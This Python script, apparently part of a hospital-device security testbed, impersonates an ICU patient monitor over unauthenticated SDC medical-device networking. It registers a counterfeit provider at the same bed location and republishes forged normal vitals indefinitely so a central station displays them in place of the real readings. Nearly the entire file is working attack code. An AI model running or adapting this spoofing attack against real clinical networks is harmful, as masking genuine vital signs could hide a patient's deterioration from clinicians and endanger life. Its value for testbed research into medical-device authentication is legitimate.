"""rogue_monitor — a counterfeit patient monitor (telemetry-injection attack).

Plain SDC does not authenticate providers: a consumer has no way to verify that a
device presenting itself as "the monitor at bed 10" is the legitimate one. This
script exploits that by standing up a second SDC monitor provider at the same
location, publishing attacker-chosen "all normal" vitals. A consumer (e.g., the
central-station bridge) that cannot tell the two apart will render the forged
stream. It is launched and torn down by the attacker service.
"""

from __future__ import annotations

import contextlib
import logging
import os
import signal
import socket
import time
import uuid
from decimal import Decimal

from sdc11073.location import SdcLocation
from sdc11073.loghelper import basic_logging_setup
from sdc11073.mdib import ProviderMdib
from sdc11073.provider import SdcProvider
from sdc11073.wsdiscovery import WSDiscovery
from sdc11073.xml_types import pm_types
from sdc11073.xml_types.dpws_types import ThisDeviceType, ThisModelType

BASE_UUID = uuid.UUID("{cc013678-79f6-403c-998f-3cc0cc050230}")
ROGUE_UUID = uuid.uuid5(BASE_UUID, "hbt-rogue-monitor")
# Attacker-chosen normal-looking vitals.
FORGED = {"spo2": 98.0, "hr": 76.0, "map": 88.0, "etco2": 38.0, "rr": 14.0}


def my_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
    return ip


def main() -> None:
    basic_logging_setup(level=logging.WARNING)
    disco = WSDiscovery(my_ip())
    disco.start()
    mdib = ProviderMdib.from_mdib_file(os.path.join(os.path.dirname(__file__), "monitor_mdib.xml"))
    # Impersonate the patient monitor: same model identity, same bed location.
    model = ThisModelType(manufacturer="hospital-bed-testbed", manufacturer_url="x",
                          model_name="ICU Monitor", model_number="1",
                          model_url="x", presentation_url="x")
    device = ThisDeviceType(friendly_name="ICU Monitor", firmware_version="1",
                            serial_number="monitor-1")
    provider = SdcProvider(ws_discovery=disco, epr=ROGUE_UUID, this_model=model,
                           this_device=device, device_mdib_container=mdib)
    provider.start_all()
    provider.set_location(SdcLocation(fac="HOSP", poc="ICU", bed="BED10"))
    with mdib.metric_state_transaction() as tx:
        for h, val in FORGED.items():
            st = tx.get_state(h)
            st.mk_metric_value()
            st.MetricValue.Value = Decimal(str(val))
            st.MetricValue.Validity = pm_types.MeasurementValidity.VALID
            st.ActivationState = pm_types.ComponentActivation.ON
    print(f"[rogue-monitor] impersonating ICU Monitor at BED10, epr={ROGUE_UUID.urn}", flush=True)

    # On termination, leave the network cleanly (send WS-Discovery Bye) so the
    # consumer drops us and reverts to the legitimate monitor.
    def shutdown(*_a):
        with contextlib.suppress(Exception):
            provider.stop_all()
        with contextlib.suppress(Exception):
            disco.stop()
        os._exit(0)

    signal.signal(signal.SIGTERM, shutdown)
    signal.signal(signal.SIGINT, shutdown)

    # Republish the forged values forever (until the process is terminated).
    while True:
        time.sleep(1.0)
        with mdib.metric_state_transaction() as tx:
            for h, val in FORGED.items():
                tx.get_state(h).MetricValue.Value = Decimal(str(val))


if __name__ == "__main__":
    main()
